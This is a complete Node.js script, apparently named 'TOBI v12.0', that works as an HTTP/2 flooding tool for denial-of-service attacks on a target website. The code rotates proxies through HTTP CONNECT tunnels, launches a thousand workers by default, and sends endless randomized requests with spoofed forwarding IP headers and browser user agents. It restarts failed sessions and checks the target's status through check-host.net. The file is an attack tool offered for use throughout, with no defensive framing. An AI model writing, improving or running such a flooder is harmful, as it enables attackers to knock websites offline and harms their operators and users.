#!/usr/bin/env node

/**
 * TOBI v12.0 – Correct HTTP/2 Flooder
 * - Proper HTTP CONNECT proxy tunneling
 * - ALPN verification for HTTP/2
 * - Stream concurrency control
 * - Event loop yielding
 * - Full session lifecycle management
 * - Race‑free stats (atomic updates)
 * - Memory leak prevention
 */

const fs = require('fs');
const net = require('net');
const tls = require('tls');
const http2 = require('http2');
const crypto = require('crypto');
const readline = require('readline');
const https = require('https');

// Colors
const c = {
    red: '\x1b[91m', green: '\x1b[92m', yellow: '\x1b[93m',
    cyan: '\x1b[96m', bold: '\x1b[1m', reset: '\x1b[0m', clear: '\x1b[2J\x1b[H'
};

// ==================== CONFIG ====================
let target = null;
let duration = 60;
let workers = 1000;
let proxyFile = null;
let stop = false;
let activeWorkers = 0;

// ==================== PROXY MANAGER ====================
let proxies = [];
let proxyIndex = 0;

function loadProxies() {
    if (!proxyFile) return;
    try {
        const content = fs.readFileSync(proxyFile, 'utf8');
        proxies = content.split('\n').filter(l => {
            l = l.trim();
            return l && !l.startsWith('#') && l.includes(':');
        });
        console.log(`${c.green}[✓] Loaded ${proxies.length} proxies${c.reset}`);
    } catch(e) {
        console.log(`${c.yellow}[!] No proxy file – running without proxies${c.reset}`);
    }
}

function getProxy() {
    if (proxies.length === 0) return null;
    proxyIndex = (proxyIndex + 1) % proxies.length;
    return proxies[proxyIndex];
}

// ==================== CORRECT HTTP CONNECT TUNNEL ====================
function createProxyTunnel(proxy, targetHost, targetPort = 443) {
    return new Promise((resolve, reject) => {
        const [proxyHost, proxyPort] = proxy.split(':');
        const socket = net.connect(parseInt(proxyPort), proxyHost);
        
        socket.once('connect', () => {
            const connectCmd = `CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}\r\n\r\n`;
            socket.write(connectCmd);
            
            let response = '';
            socket.on('data', (chunk) => {
                response += chunk.toString();
                if (response.includes('\r\n\r\n')) {
                    if (response.startsWith('HTTP/1.1 200') || response.includes('200 Connection established')) {
                        // Tunnel established – remove the HTTP response data from socket
                        socket.removeAllListeners('data');
                        resolve(socket);
                    } else {
                        reject(new Error(`Proxy refused: ${response.split('\r\n')[0]}`));
                    }
                }
            });
        });
        socket.once('error', reject);
        socket.setTimeout(10000, () => {
            socket.destroy();
            reject(new Error('Proxy tunnel timeout'));
        });
    });
}

// ==================== TLS & HTTP/2 WITH ALPN VERIFICATION ====================
const TLS_CIPHERS = [
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'TLS_AES_128_GCM_SHA256',
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-CHACHA20-POLY1305',
    'ECDHE-RSA-CHACHA20-POLY1305',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES256-GCM-SHA384'
].join(':');

function createTlsConnection(socket, host, isProxy = false) {
    return new Promise((resolve, reject) => {
        const tlsSocket = tls.connect({
            socket: socket,
            host: host,
            servername: host,
            port: 443,
            ciphers: TLS_CIPHERS,
            ecdhCurve: 'X25519',
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            honorCipherOrder: true,
            rejectUnauthorized: false,
            ALPNProtocols: ['h2', 'http/1.1']
        });
        
        tlsSocket.once('secureConnect', () => {
            const alpn = tlsSocket.alpnProtocol;
            if (alpn !== 'h2') {
                reject(new Error(`ALPN negotiated ${alpn}, not h2`));
                return;
            }
            resolve(tlsSocket);
        });
        tlsSocket.once('error', reject);
        tlsSocket.setTimeout(10000, () => {
            tlsSocket.destroy();
            reject(new Error('TLS handshake timeout'));
        });
    });
}

// ==================== CREATE HTTP/2 SESSION (FULL CORRECT) ====================
async function createHttp2Session(fullUrl, proxy) {
    const parsed = new URL(fullUrl);
    let rawSocket = null;
    
    if (proxy) {
        rawSocket = await createProxyTunnel(proxy, parsed.hostname, 443);
    } else {
        rawSocket = net.connect(443, parsed.hostname);
        await new Promise((resolve, reject) => {
            rawSocket.once('connect', resolve);
            rawSocket.once('error', reject);
            rawSocket.setTimeout(10000, () => reject(new Error('Direct connect timeout')));
        });
    }
    
    const tlsSocket = await createTlsConnection(rawSocket, parsed.hostname, !!proxy);
    const session = http2.connect(fullUrl, {
        createConnection: () => tlsSocket,
        settings: {
            enablePush: false,
            initialWindowSize: 65535,
            maxConcurrentStreams: 100
        }
    });
    
    // Wait for session to be ready
    await new Promise((resolve, reject) => {
        session.once('connect', resolve);
        session.once('error', reject);
        setTimeout(() => reject(new Error('Session connect timeout')), 5000);
    });
    
    return session;
}

// ==================== HEADERS & PATHS ====================
function randomString(len) {
    return crypto.randomBytes(len).toString('hex');
}

function spoofIP() {
    return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*254)}`;
}

const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
];

function generateHeaders(host) {
    return {
        ':method': 'GET',
        ':path': `/${randomString(8)}?t=${Date.now()}&r=${randomString(6)}`,
        ':scheme': 'https',
        ':authority': host,
        'user-agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'accept-encoding': 'gzip, deflate, br',
        'cache-control': 'no-cache',
        'x-forwarded-for': spoofIP(),
        'x-real-ip': spoofIP(),
        'referer': 'https://www.google.com/'
    };
}

// ==================== ATOMIC STATS (NO RACE CONDITIONS) ====================
let stats = {
    total: 0, success: 0, failed: 0,
    startTime: null, lastSec: 0, lastSecCount: 0, peakRps: 0
};
const statsLock = { mutex: Promise.resolve() };
async function updateStats(success) {
    await statsLock.mutex;
    let release;
    statsLock.mutex = new Promise(resolve => { release = resolve; });
    stats.total++;
    if (success) stats.success++;
    else stats.failed++;
    const nowSec = Date.now() / 1000;
    if (nowSec - stats.lastSec >= 1) {
        if (stats.lastSecCount > stats.peakRps) stats.peakRps = stats.lastSecCount;
        stats.lastSecCount = 0;
        stats.lastSec = nowSec;
    }
    stats.lastSecCount++;
    release();
}

// ==================== WORKER WITH PROPER STREAM CONTROL ====================
async function worker(fullUrl) {
    if (stop) return;
    activeWorkers++;
    let session = null;
    let sessionActive = true;
    
    try {
        const proxy = getProxy();
        session = await createHttp2Session(fullUrl, proxy);
        
        // Handle session closure
        session.on('goaway', () => { sessionActive = false; });
        session.on('close', () => { sessionActive = false; });
        session.on('error', () => { sessionActive = false; });
        
        // Get server's max concurrent streams
        const maxStreams = session.remoteSettings.maxConcurrentStreams || 100;
        let activeStreams = 0;
        
        // Flood loop with backpressure
        while (!stop && sessionActive) {
            // Respect stream limit
            while (activeStreams >= maxStreams && !stop && sessionActive) {
                await new Promise(resolve => setTimeout(resolve, 1));
            }
            if (stop || !sessionActive) break;
            
            const parsed = new URL(fullUrl);
            const headers = generateHeaders(parsed.hostname);
            let stream = null;
            try {
                stream = session.request(headers);
                activeStreams++;
                stream.on('response', (responseHeaders) => {
                    const status = responseHeaders[':status'];
                    updateStats(status >= 200 && status < 400);
                });
                stream.on('error', () => {
                    updateStats(false);
                    activeStreams--;
                });
                stream.on('close', () => {
                    activeStreams--;
                });
                stream.end();
            } catch(e) {
                updateStats(false);
                if (stream) stream.destroy();
                activeStreams--;
            }
            
            // Yield to event loop occasionally
            if (stats.total % 100 === 0) await new Promise(resolve => setImmediate(resolve));
        }
    } catch(e) {
        // Session creation failed – retry after delay
        if (!stop) {
            setTimeout(() => worker(fullUrl), 100);
        }
    } finally {
        if (session && !session.destroyed) session.destroy();
        activeWorkers--;
        if (!stop) worker(fullUrl);
    }
}

// ==================== STATS DISPLAY ====================
function displayStats() {
    const elapsed = (Date.now() - stats.startTime) / 1000;
    const rps = stats.total / Math.max(elapsed, 0.1);
    const successRate = stats.total ? (stats.success / stats.total * 100) : 0;
    process.stdout.write(`\r${c.cyan}RPS: ${c.bold}${rps.toFixed(1)}${c.reset} | ` +
        `${c.green}✓ ${stats.success.toLocaleString()}${c.reset} | ` +
        `${c.red}✗ ${stats.failed.toLocaleString()}${c.reset} | ` +
        `${c.yellow}${successRate.toFixed(1)}%${c.reset} | ` +
        `${c.dim}${elapsed.toFixed(0)}s${c.reset}`);
}

// ==================== CHECK-HOST.NET ====================
function checkHost(target) {
    return new Promise((resolve) => {
        let cleanTarget = target;
        if (!cleanTarget.startsWith('http')) cleanTarget = 'https://' + cleanTarget;
        const checkUrl = `https://check-host.net/check-http?host=${encodeURIComponent(cleanTarget)}`;
        console.log(`${c.cyan}[*] Checking ${cleanTarget} via check-host.net...${c.reset}`);
        const req = https.get(checkUrl, { rejectUnauthorized: false }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const json = JSON.parse(data);
                    console.log(`${c.green}[✓] Report: https://check-host.net/check-report/${json.request_id}${c.reset}`);
                    resolve(json);
                } catch(e) { resolve(null); }
            });
        });
        req.on('error', () => resolve(null));
        req.setTimeout(10000, () => { req.destroy(); resolve(null); });
    });
}

// ==================== MAIN ====================
async function start() {
    // Ensure target has protocol
    let fullTarget = target;
    if (!fullTarget.startsWith('http')) fullTarget = 'https://' + fullTarget;
    target = fullTarget;

    console.log(c.clear);
    console.log(`${c.red}${c.bold}
╔══════════════════════════════════════════════════════════════════════════╗
║                 🔥 TOBI v12.0 – PRODUCTION GRADE 🔥                      ║
║     HTTP CONNECT | ALPN | Stream Control | Atomic Stats | No Leaks       ║
╚══════════════════════════════════════════════════════════════════════════╝${c.reset}`);
    console.log(`\n${c.green}[✓] Target: ${target}`);
    console.log(`[✓] Duration: ${duration}s`);
    console.log(`[✓] Workers: ${workers.toLocaleString()}`);
    if (proxyFile) loadProxies();
    console.log(`${c.reset}\n`);

    await checkHost(target);

    stats.startTime = Date.now();
    stats.lastSec = stats.startTime / 1000;

    console.log(`${c.yellow}[!] Launching ${workers} workers...${c.reset}`);
    for (let i = 0; i < workers; i++) {
        worker(target);
    }
    console.log(`${c.green}[✓] All workers launched!${c.reset}\n`);

    const interval = setInterval(displayStats, 1000);

    setTimeout(() => {
        stop = true;
    }, duration * 1000);

    process.on('SIGINT', () => {
        console.log(`\n${c.yellow}[!] Shutting down...${c.reset}`);
        stop = true;
        setTimeout(() => {
            clearInterval(interval);
            const elapsed = (Date.now() - stats.startTime) / 1000;
            const successRate = stats.total ? (stats.success / stats.total * 100) : 0;
            console.log(`\n${c.magenta}${c.bold}════════════════════════════════════════════════════════════════`);
            console.log(`                    FINAL REPORT`);
            console.log(`════════════════════════════════════════════════════════════════${c.reset}`);
            console.log(`  Total Requests:  ${stats.total.toLocaleString()}`);
            console.log(`  Successful:      ${stats.success.toLocaleString()}`);
            console.log(`  Failed:          ${stats.failed.toLocaleString()}`);
            console.log(`  Success Rate:    ${successRate.toFixed(2)}%`);
            console.log(`  Peak RPS:        ${stats.peakRps}`);
            console.log(`  Duration:        ${elapsed.toFixed(1)}s`);
            console.log(`${c.magenta}════════════════════════════════════════════════════════════════${c.reset}`);
            process.exit(0);
        }, 500);
    });
}

// ==================== ENTRY POINT ====================
(async () => {
    if (process.argv[2]) {
        target = process.argv[2];
        duration = parseInt(process.argv[3]) || 60;
        workers = parseInt(process.argv[4]) || 1000;
        proxyFile = process.argv[5] || null;
        start();
    } else {
        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
        target = await new Promise(resolve => rl.question(`${c.cyan}🌐 Target URL: ${c.reset}`, resolve));
        duration = parseInt(await new Promise(resolve => rl.question(`${c.cyan}⏱️  Duration (seconds): ${c.reset}`, resolve))) || 60;
        workers = parseInt(await new Promise(resolve => rl.question(`${c.cyan}👥 Workers: ${c.reset}`, resolve))) || 1000;
        const useProxy = await new Promise(resolve => rl.question(`${c.cyan}🔄 Use proxy file? (y/n): ${c.reset}`, resolve));
        if (useProxy.toLowerCase() === 'y') {
            proxyFile = await new Promise(resolve => rl.question(`${c.cyan}📁 Proxy file path: ${c.reset}`, resolve)) || 'proxy.txt';
        }
        rl.close();
        start();
    }
})();
